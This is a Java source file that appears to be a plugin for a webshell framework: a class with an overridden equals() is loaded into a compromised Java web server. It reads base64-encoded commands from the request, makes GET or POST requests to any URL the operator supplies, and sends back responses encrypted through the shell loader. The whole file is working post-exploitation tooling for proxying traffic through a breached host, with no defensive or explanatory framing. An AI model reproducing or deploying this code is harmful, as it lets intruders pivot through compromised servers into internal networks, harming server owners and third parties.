import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class http extends ClassLoader
{
    public http(ClassLoader objParent) { super(objParent); }
    public http() { super(http.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored) {}
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();

            String z0 = mapParams.get("z0");
            String szAction = (z0 != null) ? new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8).trim() : "";

            String szStatus = "error";
            String szHttpCode = "null";
            String szDataResult = "";

            if (szAction.equalsIgnoreCase("get"))
            {
                String z1 = mapParams.get("z1");
                if (z1 == null)
                {
                    szDataResult = "Missing URL";
                }
                else
                {
                    String szURL = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8).trim();
                    String[] httpRes = fnExecuteHttp("GET", szURL, null);
                    szStatus = "ok";
                    szHttpCode = httpRes[0];
                    szDataResult = httpRes[1];
                }
            }
            else if (szAction.equalsIgnoreCase("post"))
            {
                String z1 = mapParams.get("z1");
                String z2 = mapParams.get("z2");

                if (z1 == null || z1.isEmpty())
                {
                    szDataResult = "Missing URL";
                }
                else
                {
                    String szURL = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8).trim();
                    String szPostData = (z2 != null) ? new String(Base64.getDecoder().decode(z2), StandardCharsets.UTF_8).trim() : "";
                    String[] httpRes = fnExecuteHttp("POST", szURL, szPostData);
                    szStatus = "ok";
                    szHttpCode = httpRes[0];
                    szDataResult = httpRes[1];
                }
            }
            else
            {
                szDataResult = "Invalid action";
            }

            sb.append("{\"status\":\"" + szStatus + "\"," + "\"action\":\"" + fnEscapeJson(szAction) + "\"," + "\"http_code\":" + szHttpCode + "," + "\"data\":\"" + fnEscapeJson(szDataResult) + "\"}");

            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));
                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) 
                {
                    
                }
            }
        }

        return true;
    }

    private String fnEscapeJson(String str) {
        if (str == null) return "";
        return str.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\b", "\\b")
                  .replace("\f", "\\f")
                  .replace("\n", "\\n")
                  .replace("\r", "\\r")
                  .replace("\t", "\\t");
    }

    private String[] fnExecuteHttp(String szMethod, String szUrl, String szPostData)
    {
        String[] result = new String[]{"0", ""}; // [0] = HTTP Code, [1] = Body / Error Msg
        HttpURLConnection connection = null;
        InputStream is = null;
        ByteArrayOutputStream baos = null;

        try
        {
            URL url = new URL(szUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(szMethod.toUpperCase());
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);
            connection.setInstanceFollowRedirects(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

            if ("POST".equalsIgnoreCase(szMethod))
            {
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                if (szPostData != null)
                {
                    byte[] postBytes = szPostData.getBytes(StandardCharsets.UTF_8);
                    connection.setRequestProperty("Content-Length", String.valueOf(postBytes.length));
                    try (OutputStream os = connection.getOutputStream()) {
                        os.write(postBytes);
                    }
                }
            }

            int responseCode = connection.getResponseCode();
            result[0] = String.valueOf(responseCode);

            if (responseCode >= 200 && responseCode < 400)
            {
                is = connection.getInputStream();
            } 
            else
            {
                is = connection.getErrorStream();
            }

            if (is != null)
            {
                baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[4096];
                int len;
                while ((len = is.read(buffer)) != -1)
                    baos.write(buffer, 0, len);

                result[1] = baos.toString("UTF-8");
            }

        }
        catch (Exception e)
        {
            if (result[0].equals("0"))
                result[0] = "500";

            result[1] = e.getMessage();

        }
        finally
        {
            if (baos != null)
                try { baos.close(); } catch (Exception e) {}
            if (is != null)
                try { is.close(); } catch (Exception e) {}
            if (connection != null)
                connection.disconnect();
        }

        return result;
    }
}